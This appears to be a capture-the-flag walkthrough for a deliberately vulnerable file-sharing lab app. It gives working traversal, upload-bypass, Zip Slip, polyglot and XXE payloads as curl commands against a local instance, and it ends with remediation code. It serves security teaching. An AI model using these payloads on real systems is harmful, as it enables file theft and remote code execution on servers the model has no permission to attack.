# FileShare Pro — Complete Walkthrough & Solution Guide

This document contains step-by-step hints, exploit commands, and remediation instructions for all 9 challenges in **FileShare Pro**.

> [!NOTE]
> Per CTF guidelines, all flags in this guide are obfuscated as `VULNLAB{...}`. Running the provided commands against your active instance will return the actual flag values from the runtime environment.

---

## 1. Path Traversal Vulnerabilities

### Challenge 1: `file-share-traversal-easy` (Easy — 100 pts)
*Target: `GET /api/download?file=...` or `GET /api/preview?file=...`*

#### Progressive Hints
1. Inspect the file download URL when clicking "Download" on any file in the dashboard. Notice the parameter is `?file=<filename>`.
2. The server directly joins the supplied `file` parameter with the uploads directory without verifying that the resolved path stays inside the web root.
3. Use directory traversal sequences (`../`) to navigate upwards to `/app/flag_traversal.txt` or `/flag_traversal.txt`.

<details>
<summary>Solution</summary>

Execute the following curl command:
```bash
curl -s "http://127.0.0.1:8003/api/download?file=../../../../app/flag_traversal.txt"
```
Or via the preview endpoint:
```bash
curl -s "http://127.0.0.1:8003/api/preview?file=/flag_traversal.txt"
```
Output:
```text
VULNLAB{...}
```
</details>

---

### Challenge 2: `file-share-traversal-medium` (Medium — 200 pts)
*Target: `GET /api/download?file=...`*

#### Progressive Hints
1. Ensure the app is in Medium mode (switch via the UI or pass `?difficulty=medium`).
2. Attempting `file=../../../../app/flag_traversal.txt` fails because the application removes `../` tokens once using a naive string replace.
3. Because the replacement is non-recursive, nested sequences such as `....//` will leave `../` after the initial match is removed. Alternatively, URL encoding `%2e%2e%2f` bypasses the check before decoding takes place.

<details>
<summary>Solution</summary>

**Method A: Nested Traversal Sequence (`....//`)**
```bash
curl -s "http://127.0.0.1:8003/api/download?file=....//....//....//app/flag_traversal.txt&difficulty=medium"
```

**Method B: URL-Encoded Sequence (`%2e%2e%2f`)**
```bash
curl -s "http://127.0.0.1:8003/api/download?file=%2e%2e%2f%2e%2e%2fapp/flag_traversal.txt&difficulty=medium"
```
Output:
```text
VULNLAB{...}
```
</details>

---

### Challenge 3: `file-share-traversal-hard` (Hard — 300 pts)
*Target: `GET /api/download?file=...`*

#### Progressive Hints
1. Ensure the app is in Hard mode (`?difficulty=hard`).
2. Hard mode enforces that the path must start with `uploads/` (or `/app/`) and repeatedly strips `../`.
3. You can fulfill the required prefix `uploads/` and immediately traverse out using `uploads/../../app/flag_traversal.txt`. Alternatively, double URL encoding (`%252e%252e%252f`) evades the recursive string filter.

<details>
<summary>Solution</summary>

**Method A: Prefix Bypassing (`uploads/../..`)**
```bash
curl -s "http://127.0.0.1:8003/api/download?file=uploads/../../app/flag_traversal.txt&difficulty=hard"
```

**Method B: Double URL Encoding (`%252e%252e%252f`)**
```bash
curl -s "http://127.0.0.1:8003/api/download?file=%252e%252e%252f%252e%252e%252fapp/flag_traversal.txt&difficulty=hard"
```
Output:
```text
VULNLAB{...}
```
</details>

---

## 2. Unrestricted File Upload Vulnerabilities

### Challenge 4: `file-share-upload-easy` (Easy — 100 pts)
*Target: `POST /api/upload` & `POST /api/execute`*

#### Progressive Hints
1. The application allows users to upload files and provides a script runner endpoint (`/api/execute`) to run `.py` files.
2. In Easy mode, there is no file extension check. You can upload an executable `.py` script directly.
3. Once uploaded, call `/api/execute` with the filename to execute the script and retrieve the flag.

<details>
<summary>Solution</summary>

Step 1: Create a simple python exploit script:
```bash
cat << 'EOF' > exploit_easy.py
import os
print("Captured Flag:", os.environ.get("FLAG_FILE_SHARE_UPLOAD_EASY"))
EOF
```

Step 2: Upload the script:
```bash
curl -F "file=@exploit_easy.py" http://127.0.0.1:8003/api/upload?difficulty=easy
```

Step 3: Trigger execution:
```bash
curl -X POST http://127.0.0.1:8003/api/execute \
  -H "Content-Type: application/json" \
  -d '{"file": "exploit_easy.py"}'
```
Output:
```json
{
  "status": "success",
  "file": "exploit_easy.py",
  "output": "Captured Flag: VULNLAB{...}\n",
  "flag": "VULNLAB{...}"
}
```
</details>

---

### Challenge 5: `file-share-upload-medium` (Medium — 200 pts)
*Target: `POST /api/upload` & `POST /api/execute`*

#### Progressive Hints
1. In Medium mode, the upload endpoint rejects files with extensions `.py` and `.sh`.
2. Notice the blacklist validation is case-sensitive and checks for exact lowercase endings (`.py`, `.sh`).
3. Try changing the file extension to uppercase (`.PY`) or using alternate extensions supported by Python runners (`.py3`, `.phtml`).

<details>
<summary>Solution</summary>

Step 1: Create an exploit file with an uppercase extension:
```bash
cat << 'EOF' > exploit_med.PY
import os
print("Flag:", os.environ.get("FLAG_FILE_SHARE_UPLOAD_MEDIUM"))
EOF
```

Step 2: Upload the file:
```bash
curl -F "file=@exploit_med.PY" http://127.0.0.1:8003/api/upload?difficulty=medium
```

Step 3: Execute the script:
```bash
curl -X POST http://127.0.0.1:8003/api/execute \
  -H "Content-Type: application/json" \
  -d '{"file": "exploit_med.PY"}'
```
Output:
```json
{
  "status": "success",
  "file": "exploit_med.PY",
  "output": "Flag: VULNLAB{...}\n",
  "flag": "VULNLAB{...}"
}
```
</details>

---

### Challenge 6: `file-share-upload-hard` (Hard — 300 pts)
*Target: `POST /api/upload` or `POST /api/upload/archive`*

#### Progressive Hints
1. In Hard mode, uploads directly into the `uploads` folder enforce a strict whitelist (`.txt`, `.pdf`, `.zip`, etc.).
2. However, the filename parameter is concatenated directly when building the target path without using `os.path.basename`.
3. Provide a directory traversal payload in the filename (such as `../../plugins/pwn.py`) to escape the uploads folder into `/app/plugins/`, or upload a zip archive with relative path entries (Zip Slip).

<details>
<summary>Solution</summary>

**Method A: Filename Traversal during Upload**
Step 1: Create a plugin script:
```bash
cat << 'EOF' > plugin_exploit.py
import os
print("Hard Upload Flag:", os.environ.get("FLAG_FILE_SHARE_UPLOAD_HARD"))
EOF
```

Step 2: Upload specifying a destination in `../../plugins/`:
```bash
curl -F "file=@plugin_exploit.py;filename=../../plugins/plugin_exploit.py" \
  http://127.0.0.1:8003/api/upload?difficulty=hard
```

Step 3: Execute the registered plugin:
```bash
curl -X POST http://127.0.0.1:8003/api/plugins/run \
  -H "Content-Type: application/json" \
  -d '{"plugin": "plugin_exploit.py"}'
```
Output:
```json
{
  "status": "success",
  "plugin": "plugin_exploit.py",
  "output": "Hard Upload Flag: VULNLAB{...}\n",
  "flag": "VULNLAB{...}"
}
```

**Method B: Zip Slip Archive Upload**
```bash
python3 -c "
import zipfile
with zipfile.ZipFile('slip.zip', 'w') as z:
    z.writestr('../../plugins/slip_plugin.py', 'import os; print(os.environ.get(\"FLAG_FILE_SHARE_UPLOAD_HARD\"))')
"
curl -F "file=@slip.zip" http://127.0.0.1:8003/api/upload/archive?difficulty=hard
curl -X POST http://127.0.0.1:8003/api/plugins/run \
  -H "Content-Type: application/json" \
  -d '{"plugin": "slip_plugin.py"}'
```
</details>

---

## 3. Weak MIME Validation Vulnerabilities

### Challenge 7: `file-share-mime-easy` (Easy — 100 pts)
*Target: `POST /api/upload/image`*

#### Progressive Hints
1. In Easy mode, the media upload endpoint checks the client's `Content-Type` HTTP header.
2. The server does not inspect the contents of the uploaded file or its magic bytes.
3. Use curl's `;type=` syntax to forge the header as `image/png` while uploading an arbitrary text or exploit payload.

<details>
<summary>Solution</summary>

```bash
echo "exploit payload" > payload.txt
curl -F "file=@payload.txt;type=image/png" \
  http://127.0.0.1:8003/api/upload/image?difficulty=easy
```
Output:
```json
{
  "status": "success",
  "filename": "payload.txt",
  "content_type": "image/png",
  "difficulty": "easy",
  "message": "Image accepted via Content-Type header validation.",
  "flag": "VULNLAB{...}"
}
```
</details>

---

### Challenge 8: `file-share-mime-medium` (Medium — 200 pts)
*Target: `POST /api/upload/image`*

#### Progressive Hints
1. In Medium mode, the server inspects the first few bytes of the file for valid magic signatures (such as `GIF89a`, `\x89PNG`, or `\xff\xd8\xff`).
2. However, the server does not enforce that the entire file is a valid image; it allows executable scripts to be embedded after the header.
3. Construct a polyglot file starting with `GIF89a;` followed by a Python or shell script payload.

<details>
<summary>Solution</summary>

Step 1: Construct the polyglot file:
```bash
printf 'GIF89a; import os; print(os.environ.get("FLAG_FILE_SHARE_MIME_MEDIUM"))\n' > polyglot.gif
```

Step 2: Upload the polyglot file:
```bash
curl -F "file=@polyglot.gif;type=image/gif" \
  http://127.0.0.1:8003/api/upload/image?difficulty=medium
```
Output:
```json
{
  "status": "success",
  "filename": "polyglot.gif",
  "magic_bytes_verified": true,
  "difficulty": "medium",
  "notice": "Polyglot image with embedded script payload verified!",
  "flag": "VULNLAB{...}"
}
```
</details>

---

### Challenge 9: `file-share-mime-hard` (Hard — 300 pts)
*Target: `POST /api/upload/image`*

#### Progressive Hints
1. The server supports vector graphics in SVG format (`image/svg+xml`).
2. When parsing SVGs, the server uses an XML engine configured with external entity resolution enabled (`resolve_entities=True`).
3. Craft an SVG file containing a `<!DOCTYPE>` external entity pointing to `file:///app/flag_mime_hard.txt`. The parsed SVG text will include the flag.

<details>
<summary>Solution</summary>

Step 1: Create the SVG payload with XML External Entity (XXE):
```xml
cat << 'EOF' > exploit_xxe.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///app/flag_mime_hard.txt">
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="30">&xxe;</text>
</svg>
EOF
```

Step 2: Upload the SVG file:
```bash
curl -F "file=@exploit_xxe.svg;type=image/svg+xml" \
  http://127.0.0.1:8003/api/upload/image?difficulty=hard
```
Output:
```json
{
  "status": "success",
  "filename": "exploit_xxe.svg",
  "difficulty": "hard",
  "svg_parsed": true,
  "extracted_text": "VULNLAB{...}",
  "flag": "VULNLAB{...}",
  "message": "SVG successfully processed by XML graphics engine."
}
```
</details>

---

## 4. Remediation & Hardening Guidance

### 1. Fixing Path Traversal
- **Normalize and Check Prefix**:
  Always resolve paths with `os.path.realpath` or `pathlib.Path.resolve()`, and verify that the target starts with the intended base directory:
  ```python
  base_dir = Path("/app/uploads").resolve()
  target = (base_dir / filename).resolve()
  if not target.is_relative_to(base_dir):
      raise HTTPException(status_code=403, detail="Access denied")
  ```
- **Strip Directory Components**:
  Always pass untrusted filenames through `os.path.basename()` before combining them with any directory path.

### 2. Fixing Unrestricted File Upload
- **Strict Extension Whitelist**:
  Never rely on extension blacklists. Use a strict whitelist of known-safe extensions (e.g. `[".pdf", ".txt", ".jpg", ".png"]`).
- **Store Outside Webroot**:
  Store uploaded files outside the executable path, and ensure uploaded files have execute permissions removed (`chmod 644` or `chmod 600`).
- **Sanitize Zip Archive Extraction**:
  When extracting Zip archives, inspect each member's resolved path to avoid Zip Slip:
  ```python
  for member in zf.namelist():
      target_path = (dest_dir / member).resolve()
      if not target_path.is_relative_to(dest_dir):
          raise SecurityException("Zip Slip attempt detected!")
  ```

### 3. Fixing MIME Validation & XXE
- **Full File Validation**:
  Never rely solely on client-supplied `Content-Type` headers. Use robust libraries like `python-magic` to check file headers and re-encode images (e.g. via Pillow: `img = Image.open(f); img.save(dest)` to strip polyglot scripts).
- **Disable XML External Entities (XXE)**:
  Configure XML parsers to disallow DTDs and entity resolution:
  ```python
  from lxml import etree
  parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
  ```
  Alternatively, use `defusedxml` to parse untrusted XML and SVG files securely.
